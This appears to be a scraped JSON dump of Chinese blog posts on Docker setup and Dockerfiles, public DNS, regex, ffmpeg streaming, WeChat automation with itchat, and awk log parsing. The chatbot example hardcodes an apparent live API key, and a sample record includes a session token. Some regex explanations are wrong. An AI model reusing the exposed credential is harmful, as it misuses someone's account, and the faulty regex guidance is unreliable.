--add-runtime docker-runc=/usr/libexec/docker/docker-runc-current --default-runtime=docker-runc --exec-opt nativ... └─2435 /usr/bin/docker-containerd-current -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --shim docker-containerd-shim --metrics... Jul 07 19:36:06 server dockerd-current[1067]: time=&quot;2017-07-07T19:36:06.227251719+08:00&quot; level=info msg=&quot;{Action=remove, Username=root, LoginUID=0, PID=3808}&quot; Jul 07 19:36:06 server dockerd-current[1067]: time=&quot;2017-07-07T19:36:06.227427409+08:00&quot; level=error msg=&quot;Handler for DELETE /v1.24/images/2f7 ret...fe0ddbdb&quot; Jul 07 19:36:12 server dockerd-current[1067]: time=&quot;2017-07-07T19:36:12.981076411+08:00&quot; level=info msg=&quot;{Action=remove, Username=root, LoginUID=0, PID=3814}&quot; Jul 07 19:36:12 server dockerd-current[1067]: time=&quot;2017-07-07T19:36:12.981253404+08:00&quot; level=error msg=&quot;Handler for DELETE /v1.24/images/2f7 ret...fe0ddbdb&quot; Jul 07 19:36:20 server dockerd-current[1067]: time=&quot;2017-07-07T19:36:20.013154822+08:00&quot; level=info msg=&quot;{Action=remove, Username=root, LoginUID=0, PID=3820}&quot; Jul 07 19:36:20 server dockerd-current[1067]: time=&quot;2017-07-07T19:36:20.013374382+08:00&quot; level=error msg=&quot;Handler for DELETE /v1.24/images/73f ret...f:latest&quot; Jul 07 19:36:22 server dockerd-current[1067]: time=&quot;2017-07-07T19:36:22.019631310+08:00&quot; level=info msg=&quot;{Action=remove, Username=root, LoginUID=0, PID=3826}&quot; Jul 07 19:36:22 server dockerd-current[1067]: time=&quot;2017-07-07T19:36:22.019805739+08:00&quot; level=error msg=&quot;Handler for DELETE /v1.24/images/73f ret...f:latest&quot; Jul 07 19:37:35 server dockerd-current[1067]: time=&quot;2017-07-07T19:37:35.157150181+08:00&quot; level=info msg=&quot;{Action=remove, Username=root, LoginUID=0, PID=3846}&quot; Jul 07 19:37:40 server dockerd-current[1067]: time=&quot;2017-07-07T19:37:40.235773789+08:00&quot; level=info msg=&quot;{Action=remove, Username=root, LoginUID=0, PID=3872}&quot; Hint: Some lines were ellipsized, use -l to show in full. [root@server ~]#使用普通用户运行和管理 docker [root@server ~]# usermod -G docker docker查看 docker 版本 [docker@server ~]$ docker version Client: Version: 1.12.6 API version: 1.24 Package version: docker-1.12.6-32.git88a4867.el7.centos.x86_64 Go version: go1.7.4 Git commit: 88a4867/1.12.6 Built: Mon Jul 3 16:02:02 2017 OS/Arch: linux/amd64 Cannot connect to the Docker daemon. Is the docker daemon running on this host?启动一个容器 [root@server docker]# docker run -d -p 80:80 --name webserver nginx 0c704305a6929c53da77b19b1fb1f232789c8dbb5bba1d5a5958380d7ed7dc34然后访问 停止删除 [root@server docker]# docker stop webserver webserver [root@server docker]# docker rm webserver webserver加速镜像对于使用 systemd 的系统，用 systemctl enable docker 启用服务后，编辑 /etc/systemd/system/multi-user.target.wants/docker.service 文件，找到 ExecStart= 这一行，在这行最后添加加速器地址 –registry-mirror=&lt;加速器地址&gt;，如： [root@server docker]# vim /etc/systemd/system/multi-user.target.wants/docker.service在ExecStart下加入 ExecStart=/usr/bin/dockerd --registry-mirror=https://jxus37ad.mirror.aliyuncs.com查询是否有 [root@server docker]# ps -ef | grep dockerd root 4810 1 3 20:16 ? 00:00:00 /usr/bin/dockerd-current --registry-mirror=https://jxus37ad.mirror.aliyuncs.com --add-runtime docker-runc=/usr/libexec/docker/docker-runc-current --default-runtime=docker-runc --exec-opt native.cgroupdriver=systemd --userland-proxy-path=/usr/libexec/docker/docker-proxy-current --selinux-enabled --log-driver=journald --signature-verification=false root 4922 4269 0 20:16 pts/1 00:00:00 grep --color=auto dockerd使用镜像获取镜像从 Docker Registry 获取镜像的命令是 docker pull。其命令格式为： docker pull [选项] [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt;具体的选项可以通过 docker pull –help 命令看到，这里我们说一下镜像名称的格式。 Docker Registry地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号]。默认地址是 Docker Hub。 仓库名：如之前所说，这里的仓库名是两段式名称，既 &lt;用户名&gt;/&lt;软件名&gt;。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。 比如 [root@server docker]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/nginx latest 2f7f7bce8929 40 hours ago 107.5 MB [root@server docker]# docker pull ubuntu #获取镜像 Using default tag: latest Trying to pull repository docker.io/library/ubuntu ... latest: Pulling from docker.io/library/ubuntu 75c416ea735c: Pull complete c6ff40b6d658: Pull complete a7050fc1f338: Pull complete f0ffb5cf6ba9: Pull complete be232718519c: Pull complete Digest: sha256:a0ee7647e24c8494f1cf6b94f1a3cd127f423268293c25d924fbe18fd82db5a4上面的命令中没有给出 Docker Registry 地址，因此将会从 Docker Hub 获取镜像。而镜像名称是 ubuntu，因此将会获取官方镜像 library/ubuntu 仓库中标签为Ubuntu的镜像。 运行有了镜像后，我们就可以以这个镜像为基础启动一个容器来运行。以上面的 ubuntu为例，如果我们打算启动里面的 bash 并且进行交互式操作的话，可以执行下面的命令。 [root@server docker]# docker run -it --rm ubuntu bash root@e92e28b88a65:/# root@e92e28b88a65:/# root@e92e28b88a65:/# cat /etc/os-release NAME=&quot;Ubuntu&quot; VERSION=&quot;16.04.2 LTS (Xenial Xerus)&quot; ID=ubuntu ID_LIKE=debian PRETTY_NAME=&quot;Ubuntu 16.04.2 LTS&quot; VERSION_ID=&quot;16.04&quot; HOME_URL=&quot;http://www.ubuntu.com/&quot; SUPPORT_URL=&quot;http://help.ubuntu.com/&quot; BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot; VERSION_CODENAME=xenial UBUNTU_CODENAME=xenialdocker run 就是运行容器的命令，具体格式我们会在后面的章节讲解，我们这里简要的说明一下上面用到的参数。 -it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。 –rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 –rm 可以避免浪费空间。 ubuntu：这是指用 ubuntu镜像为基础来启动容器。 bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash。 进入容器后，我们可以在 Shell 下操作，执行任何所需的命令。这里，我们执行了 cat /etc/os-release，这是 Linux 常用的查看当前系统版本的命令，从返回的结果可以看到容器内是 Ubuntu 16.04。02 LTS 系统。 最后我们通过 exit 退出了这个容器。 列出镜像[root@server docker]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/nginx latest 2f7f7bce8929 40 hours ago 107.5 MB docker.io/ubuntu latest d355ed3537e9 2 weeks ago 119.2 MB使用 Dockerfile 定制镜像镜像的定制实际上就是定制每一层所添加的配置、文件。如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么之前提及的无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是 Dockerfile。 Dockerfile 是一个文本文件，其内包含了一条条的指令(Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。 还以之前定制 nginx 镜像为例，这次我们使用 Dockerfile 来定制。 在一个空白目录中，建立一个文本文件，并命名为 Dockerfile： $ mkdir mynginx $ cd mynginx $ touch Dockerfile其内容为： FROM nginxRUN echo ‘Hello, Docker!‘ &gt; /usr/share/nginx/html/index.html这个 Dockerfile 很简单，一共就两行。涉及到了两条指令，FROM 和 RUN。 FROM 指定基础镜像所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个 nginx 镜像的容器，再进行修改一样，基础镜像是必须指定的。而 FROM 就是指定基础镜像，因此一个 Dockerfile 中 FROM 是必备的指令，并且必须是第一条指令。 在 Docker Hub1 上有非常多的高质量的官方镜像， 有可以直接拿来使用的服务类的镜像，如 nginx、redis、mongo、mysql、httpd、php、tomcat 等； 也有一些方便开发、构建、运行各种语言应用的镜像，如 node、openjdk、python、ruby、golang 等。 可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。 如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如 ubuntu、debian、centos、fedora、alpine 等，这些操作系统的软件库为我们提供了更广阔的扩展空间。 除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 scratch。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。 FROM scratch ...如果你以 scratch 为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。 不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，比如 swarm、coreos/etcd。对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接 FROM scratch 会让镜像体积更加小巧。使用 Go 语言 开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为 Go 是特别适合容器微服务架构的语言的原因之一。 RUN 执行命令RUN 指令是用来执行命令行命令的。由于命令行的强大能力，RUN 指令在定制镜像时是最常用的指令之一。其格式有两种： shell 格式：RUN &lt;命令&gt;，就像直接在命令行中输入的命令一样。刚才写的 Dockrfile 中的 RUN 指令就是这种格式。 RUN echo &apos;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&apos; &gt; /usr/share/nginx/html/index.html exec 格式：RUN [“可执行文件”, “参数1”, “参数2”]，这更像是函数调用中的格式。既然 RUN 就像 Shell 脚本一样可以执行命令，那么我们是否就可以像 Shell 脚本一样把每个命令对应一个 RUN 呢？比如这样： FROM debian:jessie RUN apt-get update RUN apt-get install -y gcc libc6-dev make RUN wget -O redis.tar.gz “http://download.redis.io/releases/redis-3.2.5.tar.gz&quot; RUN mkdir -p /usr/src/redis RUN tar -xzf redis.tar.gz -C /usr/src/redis –strip-components=1 RUN make -C /usr/src/redis RUN make -C /usr/src/redis install 之前说过，Dockerfile 中每一个指令都会建立一层，RUN 也不例外。每一个 RUN 的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后，commit 这一层的修改，构成新的镜像。 而上面的这种写法，创建了 7 层镜像。这是完全没有意义的，而且很多运行时不需要的东西，都被装进了镜像里，比如编译环境、更新的软件包等等。结果就是产生非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。 这是很多初学 Docker 的人常犯的一个错误。 Union FS 是有最大层数限制的，比如 AUFS，曾经是最大不得超过 42 层，现在是不得超过 127 层。 上面的 Dockerfile 正确的写法应该是这样： FROM debian:jessie RUN buildDeps=&apos;gcc libc6-dev make&apos; \\ &amp;&amp; apt-get update \\ &amp;&amp; apt-get install -y $buildDeps \\ &amp;&amp; wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-3.2.5.tar.gz&quot; \\ &amp;&amp; mkdir -p /usr/src/redis \\ &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\ &amp;&amp; make -C /usr/src/redis \\ &amp;&amp; make -C /usr/src/redis install \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; rm redis.tar.gz \\ &amp;&amp; rm -r /usr/src/redis \\ &amp;&amp; apt-get purge -y --auto-remove $buildDeps首先，之前所有的命令只有一个目的，就是编译、安装 redis 可执行文件。因此没有必要建立很多层，这只是一层的事情。因此，这里没有使用很多个 RUN 对一一对应不同的命令，而是仅仅使用一个 RUN 指令，并使用 &amp;&amp; 将各个所需命令串联起来。将之前的 7 层，简化为了 1 层。在撰写 Dockerfile 的时候，要经常提醒自己，这并不是在写 Shell 脚本，而是在定义每一层该如何构建。 并且，这里为了格式化还进行了换行。Dockerfile 支持 Shell 类的行尾添加 \\ 的命令换行方式，以及行首 # 进行注释的格式。良好的格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。 此外，还可以看到这一组命令的最后添加了清理工作的命令，删除了为了编译构建所需要的软件，清理了所有下载、展开的文件，并且还清理了 apt 缓存文件。这是很重要的一步，我们之前说过，镜像是多层存储，每一层的东西并不会在下一层被删除，会一直跟随着镜像。因此镜像构建时，一定要确保每一层只添加真正需要添加的东西，任何无关的东西都应该清理掉。 很多人初学 Docker 制作出了很臃肿的镜像的原因之一，就是忘记了每一层构建的最后一定要清理掉无关文件。 构建镜像好了，让我们再回到之前定制的 nginx 镜像的 Dockerfile 来。现在我们明白了这个 Dockerfile 的内容，那么让我们来构建这个镜像吧。 在 Dockerfile 文件所在目录执行： $ docker build -t nginx:v3 . Sending build context to Docker daemon 2.048 kB Step 1 : FROM nginx ---&gt; e43d811ce2f4 Step 2 : RUN echo &apos;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&apos; &gt; /usr/share/nginx/html/index.html ---&gt; Running in 9cdc27646c7b ---&gt; 44aa4490ce2c Removing intermediate container 9cdc27646c7b Successfully built 44aa4490ce2c从命令的输出结果中，我们可以清晰的看到镜像的构建过程。在 Step 2 中，如同我们之前所说的那样，RUN 指令启动了一个容器 9cdc27646c7b，执行了所要求的命令，并最后提交了这一层 44aa4490ce2c，随后删除了所用到的这个容器 9cdc27646c7b。 这里我们使用了 docker build 命令进行镜像构建。其格式为： docker build [选项] &lt;上下文路径/URL/-&gt;在这里我们指定了最终镜像的名称 -t nginx:v3，构建成功后，我们可以像之前运行 nginx:v2 那样来运行这个镜像，其结果会和 nginx:v2 一样。 镜像构建上下文（Context）如果注意，会看到 docker build 命令最后有一个 .。. 表示当前目录，而 Dockerfile 就在当前目录，因此不少初学者以为这个路径是在指定 Dockerfile 所在路径，这么理解其实是不准确的。如果对应上面的命令格式，你可能会发现，这是在指定上下文路径。那么什么是上下文呢？ 首先我们要理解 docker build 的工作原理。Docker 在运行时分为 Docker 引擎（也就是服务端守护进程）和客户端工具。Docker 的引擎提供了一组 REST API，被称为 Docker Remote API，而如 docker 命令这样的客户端工具，则是通过这组 API 与 Docker 引擎交互，从而完成各种功能。因此，虽然表面上我们好像是在本机执行各种 docker 功能，但实际上，一切都是使用的远程调用形式在服务端（Docker 引擎）完成。也因为这种 C/S 设计，让我们操作远程服务器的 Docker 引擎变得轻而易举。 当我们进行镜像构建的时候，并非所有定制都会通过 RUN 指令完成，经常会需要将一些本地文件复制进镜像，比如通过 COPY 指令、ADD 指令等。而 docker build 命令构建镜像，其实并非在本地构建，而是在服务端，也就是 Docker 引擎中构建的。那么在这种客户端/服务端的架构中，如何才能让服务端获得本地文件呢？ 这就引入了上下文的概念。当构建的时候，用户会指定构建镜像上下文的路径，docker build 命令得知这个路径后，会将路径下的所有内容打包，然后上传给 Docker 引擎。这样 Docker 引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。 如果在 Dockerfile 中这么写： COPY ./package.json /app/这并不是要复制执行 docker build 命令所在的目录下的 package.json，也不是复制 Dockerfile 所在目录下的 package.json，而是复制 上下文（context） 目录下的 package.json。 因此，COPY 这类指令中的源文件的路径都是相对路径。这也是初学者经常会问的为什么 COPY ../package.json /app 或者 COPY /opt/xxxx /app 无法工作的原因，因为这些路径已经超出了上下文的范围，Docker 引擎无法获得这些位置的文件。如果真的需要那些文件，应该将它们复制到上下文目录中去。 现在就可以理解刚才的命令 docker build -t nginx:v3 . 中的这个 .，实际上是在指定上下文的目录，docker build 命令会将该目录下的内容打包交给 Docker 引擎以帮助构建镜像。 如果观察 docker build 输出，我们其实已经看到了这个发送上下文的过程： [root@server myubuntu]# docker build -t redis . Sending build context to Docker daemon 2.56 kB理解构建上下文对于镜像构建是很重要的，避免犯一些不应该的错误。比如有些初学者在发现 COPY /opt/xxxx /app 不工作后，于是干脆将 Dockerfile 放到了硬盘根目录去构建，结果发现 docker build 执行后，在发送一个几十 GB 的东西，极为缓慢而且很容易构建失败。那是因为这种做法是在让 docker build 打包整个硬盘，这显然是使用错误。 一般来说，应该会将 Dockerfile 置于一个空目录下，或者项目根目录下。如果该目录下没有所需文件，那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给 Docker 引擎，那么可以用 .gitignore 一样的语法写一个 .dockerignore，该文件是用于剔除不需要作为上下文传递给 Docker 引擎的。 那么为什么会有人误以为 . 是指定 Dockerfile 所在目录呢？这是因为在默认情况下，如果不额外指定 Dockerfile 的话，会将上下文目录下的名为 Dockerfile 的文件作为 Dockerfile。 这只是默认行为，实际上 Dockerfile 的文件名并不要求必须为 Dockerfile，而且并不要求必须位于上下文目录中，比如可以用 -f ../Dockerfile.php 参数指定某个文件作为 Dockerfile。 当然，一般大家习惯性的会使用默认的文件名 Dockerfile，以及会将其置于镜像构建上下文目录中。 动手自己编译个 redis[root@server myubuntu]# docker build -t redis . Sending build context to Docker daemon 2.56 kB Step 1 : FROM ubuntu ---&gt; d355ed3537e9 Step 2 : RUN buildDeps=&quot;gcc lib6-dev make&quot; &amp;&amp; apt-get update &amp;&amp; apt-get install -y $buildDeps &amp;&amp; wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-3.2.5.tar.gz&quot; &amp;&amp; mkdir -p /usr/src/redis &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 &amp;&amp; make -C /usr/src/redis &amp;&amp; make -C /usr/src/redis install &amp;&amp; rm -rf /var/lib/apt/lists/* &amp;&amp; rm redis.tar.gz &amp;&amp; rm -r /usr/src/redis &amp;&amp; apt-get purge -y --auto-remove $buildDeps ---&gt; Running in 7540e102cbf4 Get:1 http://security.ubuntu.com/ubuntu xenial-security InRelease [102 kB] Get:2 http://archive.ubuntu.com/ubuntu xenial InRelease [247 kB] Get:3 http://security.ubuntu.com/ubuntu xenial-security/universe Sources [39.9 kB] Get:4 http://security.ubuntu.com/ubuntu xenial-security/main amd64 Packages [370 kB] Get:5 http://security.ubuntu.com/ubuntu xenial-security/restricted amd64 Packages [12.8 kB] Get:6 http://security.ubuntu.com/ubuntu xenial-security/universe amd64 Packages [173 kB] Get:7 http://security.ubuntu.com/ubuntu xenial-security/multiverse amd64 Packages [2937 B]","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"你为什么应该使用公共的 dns","slug":"你为什么应该使用公共的-dns","date":"2017-03-09T13:06:00.000Z","updated":"2021-02-26T06:05:29.301Z","comments":true,"path":"posts/1667228395.html","link":"","permalink":"https://awen.me/posts/1667228395.html","excerpt":"困境不管是家庭宽带还是公司出口，如果使用的是运营商分配给你的本地dns，那么你将遇到以下问题： 1.有些网站迟迟无法访问2.遭受运营商 dns 劫持3.访问网站速度很慢","text":"困境不管是家庭宽带还是公司出口，如果使用的是运营商分配给你的本地dns，那么你将遇到以下问题： 1.有些网站迟迟无法访问2.遭受运营商 dns 劫持3.访问网站速度很慢 这个时候，你需要做的就是去修改你的 dns，一般推荐： 国内用户1.阿里云的 223.5.5.5 223.6.6.62.dnspod 119.29.29.293.114： 114.114.114.114 国外不建议国内网民使用 1.Google 8.8.8.8 使用公共的 dns，其 dns 缓存更新会比较快，通常，修改 dns 解析后会在48小时内生效，但是使用公共 dns，这一时间会变得快很多。 如何修改？这种简单的问题，我不想写了，你去百度，去谷歌，一般有2种方式： 1.计算机网卡属性中修改2.路由器上设置","categories":[],"tags":[{"name":"DNS","slug":"DNS","permalink":"https://awen.me/tags/DNS/"}]},{"title":"正则表达式学习（一）","slug":"正则表达式学习（一）","date":"2017-03-08T12:49:00.000Z","updated":"2021-02-26T06:05:29.344Z","comments":true,"path":"posts/2907850497.html","link":"","permalink":"https://awen.me/posts/2907850497.html","excerpt":"元字符 代码 说明 . 匹配除换行符意外的任意字符 \\w 匹配字母或数字或下划线或汉字 \\s 匹配任意的空白字符 \\d 匹配数字 \\b 匹配单词的开始或者结束 ^ 匹配单词的开始 $ 匹配字符串的结束","text":"元字符 代码 说明 . 匹配除换行符意外的任意字符 \\w 匹配字母或数字或下划线或汉字 \\s 匹配任意的空白字符 \\d 匹配数字 \\b 匹配单词的开始或者结束 ^ 匹配单词的开始 $ 匹配字符串的结束 字符转义如果要想查元字符的话，比如要匹配www.baidu.com，那么由于.已经被用做元字符了，所以你需要\\.这样转义下才能匹配到. 重复 代码/语法 说明 * 重复零次或更多次 + 重复一次或更多次 ？ 重复零次或一次 {n} 重复 n 次 {n,} 重复 n 次货更多次 {n,m} 重复 n 到 m 次 分支条件比如我们需要同时匹配(010)223242322和0559-222341242,我们通常使用|来进行区分，正则如下： (0?\\d{4}-\\d{8})|(\\(0\\d{2}\\)\\d{8})分组比如，我们要匹配 ip 地址221.222.123.223,我们就需要使用分组，通常我们使用小括号来指定子表达式，然后可以指定这个子表达式的重复次数 (\\d{1,3}\\.)\\d{1,}但是，这样，我们匹配到的也可能是300.300.300.300这样的不可能存在的 ip 地址，所以，我们只能使用冗长的分组 ((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)反义 代码/语法 说明 \\W 匹配任意不是字母，数字，下划线，汉子的字符 \\S 匹配任意不是空白的字符 \\D 匹配任意非数字的字符 \\B 匹配不是单词开头或结束的位置 [^x] 匹配除了x 以外的任意字符 [^aeiou] 匹配除了 aeiou 这几个字母以外的任意字符 举例，我们有一条字符串 cv?uuid=9f0d65cf6ba397d5b5cb0c9aa0c12df1&amp;tc=113283078&amp;p=kxescore.exe&amp;c=1335&amp;f=json 我们要匹配不包含 f=json 以外的内容,正则表达式如下： [^(f=json)]","categories":[],"tags":[{"name":"正则","slug":"正则","permalink":"https://awen.me/tags/%E6%AD%A3%E5%88%99/"}]},{"title":"通过 ffmpeg 推流","slug":"通过-ffmpeg-推流","date":"2017-03-07T06:35:00.000Z","updated":"2021-02-26T06:05:29.359Z","comments":true,"path":"posts/1077264100.html","link":"","permalink":"https://awen.me/posts/1077264100.html","excerpt":"命令写个简单的脚本，让流一直推 ➜ cmd cat push_stream #!/bin/bash COUNT=0 while [ $COUNT -lt 5 ] do ffmpeg -i $1 -vcodec libx264 -acodec aac -f flv rtmp://test.v0.v5linux.com/live/lol done","text":"命令写个简单的脚本，让流一直推 ➜ cmd cat push_stream #!/bin/bash COUNT=0 while [ $COUNT -lt 5 ] do ffmpeg -i $1 -vcodec libx264 -acodec aac -f flv rtmp://test.v0.v5linux.com/live/lol done 重点是 $1 替换成你的视频文件 ffmpeg -i $1 -vcodec libx264 -acodec aac -f flv rtmp://test.v0.v5linux.com/live/lol done","categories":[],"tags":[{"name":"直播","slug":"直播","permalink":"https://awen.me/tags/%E7%9B%B4%E6%92%AD/"}]},{"title":"利用itchat 给你的微信好友发送祝福","slug":"利用itchat-给你的微信好友发送祝福","date":"2017-03-04T14:49:00.000Z","updated":"2021-02-26T06:05:29.318Z","comments":true,"path":"posts/3287584107.html","link":"","permalink":"https://awen.me/posts/3287584107.html","excerpt":"使用我们可以通过itchat去获取微信好友列表，然后进行发送","text":"使用我们可以通过itchat去获取微信好友列表，然后进行发送 代码如下： #coding=utf8 import itchat, time itchat.auto_login(True) SINCERE_WISH = u&apos;祝%s新年快乐！&apos; #定义需要发送的字符串 friendList = itchat.get_friends(update=True)[1:] #获取好友列表 for friend in friendList: #循环遍历通过itchat.sed发送祝福 itchat.send (SINCERE_WISH % (friend[&apos;RemarkName&apos;] or friend[&apos;NickName&apos;]), friend[&apos;UserName&apos;]) time.sleep(.5)备注在微信的元数据中，每一个好友的元数据，都是由{}构成 {u&apos;UserName&apos;: u&apos;@d49b791c884a56c5a86500b84479d819&apos;, u&apos;City&apos;: u&apos;\\u95f5\\u884c&apos;, u&apos;DisplayName&apos;: u&apos;&apos;, u&apos;UniFriend&apos;: 0, u&apos;MemberList&apos;: [], u&apos;PYQuanPin&apos;: u&apos;321&apos;, u&apos;RemarkPYInitial&apos;: u&apos;NWDR&apos;, u&apos;Uin&apos;: u&apos;cxiang123&apos;, u&apos;AppAccountFlag&apos;: 0, u&apos;VerifyFlag&apos;: 0, u&apos;Province&apos;: u&apos;\\u4e0a\\u6d77&apos;, u&apos;KeyWord&apos;: u&apos;cxi&apos;, u&apos;RemarkName&apos;: u&apos;\\u5973\\u738b\\u5927\\u4eba&apos;, u&apos;PYInitial&apos;: u&apos;321&apos;, u&apos;ChatRoomId&apos;: 0, u&apos;IsOwner&apos;: 0, u&apos;HideInputBarFlag&apos;: 0, u&apos;EncryChatRoomId&apos;: u&apos;&apos;, u&apos;AttrStatus&apos;: 68543, u&apos;SnsFlag&apos;: 49, u&apos;MemberCount&apos;: 0, u&apos;OwnerUin&apos;: 0, u&apos;Alias&apos;: u&apos;&apos;, u&apos;Signature&apos;: u&apos;\\u966a\\u4f34\\u662f\\u6700\\u957f\\u60c5\\u7684\\u544a\\u767d&apos;, u&apos;ContactFlag&apos;: 3, u&apos;NickName&apos;: u&apos;321&apos;, u&apos;RemarkPYQuanPin&apos;: u&apos;nvwangdaren&apos;, u&apos;HeadImgUrl&apos;: u&apos;/cgi-bin/mmwebwx-bin/webwxgeticon?seq=650013380&amp;username=@d49b791c884a56c5a86500b84479d819&amp;skey=@crypt_1aee04b5_bc95b93ba96f9697c1e22133cd91ff3f&apos;, u&apos;Sex&apos;: 1, u&apos;StarFriend&apos;: 0, u&apos;Statues&apos;: 0}其中UserName是 微信id;Alias 是微信号;NickName是昵称;RemarkName是备注;Sex是性别 1 表示男性，2 表示女性。 比如即将到来的女生节 妇女节，你可以通过判断是女性，给她发消息 #coding=utf8 import itchat, time itchat.auto_login(True) SINCERE_WISH = u&apos;祝%s女生节快乐!&apos; friendList = itchat.get_friends(update=True)[1:] for friend in friendList: if friend[&apos;Sex&apos;] == 2: itchat.send (SINCERE_WISH % (friend[&apos;RemarkName&apos;] or friend[&apos;NickName&apos;]), friend[&apos;UserName&apos;]) time.sleep(.5)","categories":[],"tags":[{"name":"itchat","slug":"itchat","permalink":"https://awen.me/tags/itchat/"}]},{"title":"打造对接个人微信的智能聊天机器人","slug":"打造对接个人微信的智能聊天机器人","date":"2017-03-03T05:19:00.000Z","updated":"2021-02-26T06:05:29.338Z","comments":true,"path":"posts/3487497528.html","link":"","permalink":"https://awen.me/posts/3487497528.html","excerpt":"前言相信不少人应该听过微软小冰，如果没有听过微软小冰，可以微信关注微软小冰公众号，发个语音、图片或文件看看小冰的回复","text":"前言相信不少人应该听过微软小冰，如果没有听过微软小冰，可以微信关注微软小冰公众号，发个语音、图片或文件看看小冰的回复 那么，你有没有想过，通过你自己的微信号打造一个聊天机器人是否可行呢？答案是肯定的咯 看下面这段对话，其实是在和机器人的对话哦！那么是如何做到的呢？ 我们可以通过微信的一个python开源库itchat，然后对接图灵机器人的api接口实现 安装pip install itchat关于如何使用，可以参考 http://itchat.readthedocs.io/zh/latest/部署在服务器上1.开启一个screen screen -S itchat2.然后新建一个py文件，代码如下： #coding=utf8 import requests import itchat KEY = &apos;8edce3ce905a4c1dbb965e6b35c3834d&apos; # 这里填写你的图灵api代码 def get_response(msg): # 这里我们就像在“3. 实现最简单的与图灵机器人的交互”中做的一样 # 构造了要发送给服务器的数据 apiUrl = &apos;http://www.tuling123.com/openapi/api&apos; data = { &apos;key&apos; : KEY, &apos;info&apos; : msg, &apos;userid&apos; : &apos;wechat-robot&apos;, } try: r = requests.post(apiUrl, data=data).json() # 字典的get方法在字典没有&apos;text&apos;值的时候会返回None而不会抛出异常 return r.get(&apos;text&apos;) # 为了防止服务器没有正常响应导致程序异常退出，这里用try-except捕获了异常 # 如果服务器没能正常交互（返回非json或无法连接），那么就会进入下面的return except: # 将会返回一个None return # 这里是我们在“1. 实现微信消息的获取”中已经用到过的同样的注册方法 @itchat.msg_register(itchat.content.TEXT) def tuling_reply(msg): # 为了保证在图灵Key出现问题的时候仍旧可以回复，这里设置一个默认回复 defaultReply = &apos;I received: &apos; + msg[&apos;Text&apos;] # 如果图灵Key出现问题，那么reply将会是None reply = get_response(msg[&apos;Text&apos;]) # a or b的意思是，如果a有内容，那么返回a，否则返回b # 有内容一般就是指非空或者非None，你可以用`if a: print(&apos;True&apos;)`来测试 return reply or defaultReply # 为了让实验过程更加方便（修改程序不用多次扫码），我们使用热启动 itchat.auto_login(hotReload=True) itchat.run()我们主要看 KEY = &apos;8edce3ce905a4c1dbb965e6b35c3834d&apos; # 这里填写你的图灵api代码还有 itchat.auto_login(hotReload=True) ## 主要是不需要每次都扫二维码登陆图灵机器人的api，需要到图灵官网http://www.tuling123.com 申请","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"},{"name":"itchat","slug":"itchat","permalink":"https://awen.me/tags/itchat/"}]},{"title":"利用 awk  统计请求文件的大小，计算流量","slug":"利用-awk--统计请求文件的大小，计算流量","date":"2017-02-23T03:50:00.000Z","updated":"2021-02-26T06:05:29.316Z","comments":true,"path":"posts/3033958530.html","link":"","permalink":"https://awen.me/posts/3033958530.html","excerpt":"需求有时候，我们希望统计以下nginx日志文件中的请求文件大小，相加后进行计算，听起来有些不可思议，但是利用 awk 却变得非常简单。 步骤首先，我们过滤下日志，比如过滤某天20:30-20:35之间的日志，我们的日志格式如下","text":"需求有时候，我们希望统计以下nginx日志文件中的请求文件大小，相加后进行计算，听起来有些不可思议，但是利用 awk 却变得非常简单。 步骤首先，我们过滤下日志，比如过滤某天20:30-20:35之间的日志，我们的日志格式如下 115.205.71.215 - - [30/Dec/2016:15:44:50 +0800] &quot;GET /phpmyadmin/phpmyadmin.css.php?nocache=4411476529ltr HTTP/2.0&quot; 200 21672 &quot;https://awen.me/phpmyadmin/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&quot;我们现在先提取20:30-35之间的日志 grep -E 20:3[0-5]:[00-59] access.log &gt;&gt; log.log然后 cat 